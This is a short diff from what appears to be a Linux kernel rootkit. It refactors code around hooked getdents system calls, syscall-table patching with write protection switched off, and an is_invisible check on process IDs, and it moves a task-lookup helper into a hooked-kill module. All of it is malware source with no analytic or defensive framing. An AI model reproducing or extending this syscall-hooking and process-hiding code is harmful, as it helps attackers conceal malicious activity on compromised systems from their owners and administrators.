@@ -14,6 +14,7 @@
 
 #include "../hooking.h"
 #include "h_getdents.h"
+#include "h_kill.h"
 
 sysfun_t orig_getdents;
 sysfun_t orig_getdents64;
@@ -151,16 +152,6 @@ void restore_getdents(void)
     syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
 
     protect_memory(old_cr0);
-}
-
-struct task_struct * find_task(pid_t pid)
-{
-	struct task_struct *p = current;
-	for_each_process(p) {
-		if (p->pid == pid)
-			return p;
-	}
-	return NULL;
 }
 
 int is_invisible(pid_t pid)
